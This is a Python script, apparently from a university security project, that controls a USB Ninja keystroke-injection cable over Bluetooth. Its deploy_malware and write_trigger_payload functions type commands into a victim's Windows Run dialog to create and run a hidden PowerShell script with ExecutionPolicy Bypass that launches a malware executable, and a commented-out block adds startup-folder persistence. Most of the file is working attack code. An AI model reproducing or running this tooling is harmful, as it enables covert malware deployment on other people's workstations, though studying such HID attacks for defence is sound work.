# This deamon script allows to trigger over bluetooth the payload (A or B) to run by the USB Ninja cable or to send a custom payload to the USB Ninja cable professional
# Thanks to the Embedded Lab Vienna for IoT & Security (see https://wiki.elvis.science/index.php?title=Embedded_Lab_Vienna_for_IoT_%26_Security:About) for their help on the USB Ninja cable.

# Copyright (C) 2023  Gaiëtan Renault.

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

import asyncio
from bleak import BleakScanner, BleakClient
import time
import traceback


def convert_qwert_azert(message: str):
    """Converts a azerty keystrokes string into its equivalent qwerty keystrokes string

    Args:
        message (str): The string to convert (ex: "azerty")

    Returns:
        str: The converted string (ex: "qwerty")
    """
    return message.translate(str.maketrans('qwertyuiop64asdfghjkl,8zxcvbn;mM1&é"\'(-è_çà+QWERTYUIOPASDFGHJKL?5ZXCVBN§:!/.1%3457ù9082^$)',
                                           'azertyuiop^$qsdfghjklm*wxcvbn,;:!1234567890+AZERTYUIOPQSDFGHJKLM%WXCVBN?./><!"#$%&\'()*@[]-'))


def chunkstring(string: str, length: int):
    """Chunk a string into equal length strings

    Args:
        string (str): String to shunk
        length (int): Chunk size

    Returns:
        str: List of chunked strings
    """
    return (string[0+i:length+i] for i in range(0, len(string), length))


def format_string_to_send(packet: str, prefix: str = "STRING "):
    """Format the string to send to the USB Ninja cable pro.

    Args:
        packet (str): Packet of characters to send
        prefix (_type_): Prefix of the packet to send (see USB Ninja pro github for more info). Default is "STRING ". Must be equal to "STRING ", "ENTER" or "SHIFT ".

    Returns:
        str list: Packet array to send
    """
    assert prefix in {"STRING ", "ENTER", "SHIFT ", ""}
    if packet in {"ENTER", "NEXTID:8", "REMOTE", "MSCONOFF 0", "USBON", "ENDRUN", "WINDOWS r"}:
        return [packet.encode() + b"\x0d\x0a"]
    if packet == '>':
        return [b"SHIFT \xfd\x0d\x0a"]
    for i, char in enumerate(packet):
        if char == '^':
            packet = packet[:i + 1] + ' ' + packet[i + 1:]
    result = []
    for elem in chunkstring(convert_qwert_azert(packet), 20):
        result += [prefix.encode() + elem.encode() + b'\x0d\x0a']
    return result


def write_trigger_payload(payload):
    """Computes the payload array to send to the USB Ninja cable Pro to write payload into the trigger.txt file.

    Args:
        payload (str): payload to write in the file %USERPROFILE%/Desktop/powershell_script/trigger.txt

    Returns:
        str array: String array of the commands
    """
    tmp = ["NEXTID:8", "REMOTE", "MSCONOFF 0", "USBON", "WINDOWS r",  # "ENDRUN",
           # Hides console:
           # "cmd /k powershell -windowstyle hidden -file .//nf.ps1",
           # OR Does not hide the console:
           "cmd /k powershell -file .//nf.ps1",
           "ENTER", "cd %USERPROFILE%//Desktop//powershell_script", "ENTER", "echo " + payload,
           ">", "trigger.txt", "ENTER", "exit", "ENTER",
           ]
    result = [tmp[0].encode() + b'\x0a']
    for i in range(1, len(tmp)):
        result = result + format_string_to_send(tmp[i])
    return result


def deploy_malware():
    """Returns the payload array to send to the USB Ninja cable pro to deploy the malware (assumed already present on the engineering workstation)

    Returns:
        str array: String array of the commands
    """
    tmp = ["NEXTID:8", "REMOTE", "MSCONOFF 0", "USBON", "WINDOWS r",  # "ENDRUN",
           # Hides console:
           # "cmd /k powershell -windowstyle hidden -file .//nf.ps1",
           # OR Does not hide the console:
           "cmd /k powershell -file .//nf.ps1",
           "ENTER", "cd %USERPROFILE%//Desktop",
           "ENTER", "mkdir powershell_script", "ENTER",
           "cd powershell_script", "ENTER",
           "echo init", ">",
           "trigger.txt", "ENTER",
           ".", ">",
           "script.ps1 2", ">",
           "NUL", "ENTER",
           "echo $path=\"$env:userprofile//Desktop//Malware//malwar3.exe\";Start-Process -FilePath $path;",
           ">", ">",
           "script.ps1", "ENTER",
           # ONLY USED for persistence (creates a shortcut hello.lnk of the malware in the startup folder of windows), slows donw the attack deployment
           #    "echo Set oWS=WScript.CreateObject(\"WScript.Shell\")",
           #    ">",
           #    "VBs.vbs", "ENTER",
           #    "echo sHF=oWS.ExpandEnvironmentStrings(\"%USERPROFILE%\")",
           #    ">", ">",
           #    "VBs.vbs", "ENTER",
           #    "echo sLinkFile^=sHF ^& \"//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup//Hello.lnk\"",
           #    ">", ">",
           #    "VBs.vbs", "ENTER",
           #    "echo Set oLink=oWS.CreateShortcut(sLinkFile)",
           #    ">", ">",
           #    "VBs.vbs", "ENTER",
           #    "echo tPath=\"C://Windows//System32//WindowsPowerShell//v1.0//powershell.exe\"",
           #    ">", ">",
           #    "VBs.vbs", "ENTER",
           #    "echo oLink.TargetPath=tPath",
           #    ">", ">",
           #    "VBs.vbs", "ENTER",
           #    "echo oLink.Arguments^=\"-WindowStyle Hidden -NoLogo -ExecutionPolicy Bypass -File \" ^& sHF ^& \"//Desktop//powershell_script//script.ps1\"",  ">", ">",
           #    "VBs.vbs", "ENTER",
           #    "echo oLink.Save", ">", ">",  "VBs.vbs", "ENTER",
           #    "cscript VBs.vbs", "ENTER",
           "powershell -ExecutionPolicy ByPass -windowstyle hidden -file .//script.ps1", "ENTER",
           ]
    result = [tmp[0].encode() + b'\x0a']
    for i in range(1, len(tmp)):
        result = result + format_string_to_send(tmp[i])
    return result


def deamon(BLE_address: str, password: bytes, payload: str, return_dict: bool, cable: str):
    """Multiprocessing deamon that triggers over bluetooth the payload run by the USB Ninja cable)

        Args:
            BLE_address (str, required): Bluetooth address of the USB ninja cable.
            password (bytes, required): Password of the USB Ninja cable (defined when running MSc_Project\\Attacks\\USBNinja\\Arduino_sketch\\NinjaBLESetup_MySetup_name_pwd\\NinjaBLESetup_MySetup_name_pwd.ino).
            payload (str, required): Payload to trigger (stored in the USB Ninja arduino), either 'A' or 'B'.
            return_dict (bool, required): Return if connection to USB cable and payload trigger worked.
            cable (str, required): USB Ninja cable or USB Ninja cable professional ("USB Ninja cable" or "USB Ninja cable pro.")
        """
    async def trigger_payload(BLE_address: str, password: str, payload: str, cable: str):
        """Trigger over bluetooth the payload run by the USB Ninja cable or the USB Ninja cable professional

        Args:
            BLE_address (str, required): Bluetooth address of the USB ninja cable.
            password (str, required): Password of the USB Ninja cable (defined when running MSc_Project\\Attacks\\USBNinja\\Arduino_sketch\\NinjaBLESetup_MySetup_name_pwd\\NinjaBLESetup_MySetup_name_pwd.ino).
            payload (str, required): Payload to trigger (stored in the USB Ninja arduino), either 'A' or 'B' if USB Ninja cable is used.
            cable (str, required): USB Ninja cable or USB Ninja cable professional ("USB Ninja cable" or "USB Ninja cable pro.")
        """
        assert cable == "USB Ninja cable pro." or (
            cable == "USB Ninja cable" and payload in {"A", "B"})

        async with BleakClient(BLE_address) as client:
            if cable == "USB Ninja cable":
                service_nbr = 36
                try:
                    await client.write_gatt_char(service_nbr, password)
                except:
                    pass
                if payload == "A":
                    await client.write_gatt_char(service_nbr, b'\x41\x3d\x4c\x0d\x0a')
                else:  # payload = "B"
                    await client.write_gatt_char(service_nbr, b'\x42\x3d\x4c\x0d\x0a')

            elif cable == "USB Ninja cable pro.":
                service_nbr = 43
                service_nbr_response = 0x1B
                # Passowrd (default on USB Ninja pro is 8888)
                await client.write_gatt_char(service_nbr, password.encode(), True)
                tmp = await client.read_gatt_char(service_nbr_response)
                if payload == "init":
                    command_array = deploy_malware()
                else:
                    command_array = write_trigger_payload(payload)
                for i in range(len(command_array)):
                    await client.write_gatt_char(service_nbr, command_array[i], True)
                    # Waits the Execute windows to open (with Win + R shortcut)
                    await client.read_gatt_char(service_nbr_response)
                    if i in {4, 7}:
                        time.sleep(4)
                    # Sends packet to fill out the buffer on the USB Ninja cable pro.
                    # as sometimes sent packet is not written directly by the cable and waits new packets
                    else:
                        for _ in range(len(command_array[i])//2):
                            await client.write_gatt_char(service_nbr, b"STRING \x00\x0d\x0a", True)

    try:
        asyncio.run(trigger_payload(BLE_address=BLE_address,
                    password=password, payload=payload, cable=cable))
        return_dict["success"] = True
    except Exception as error:
        print("Trigger failed.")
        print(error)
        traceback.print_exc()
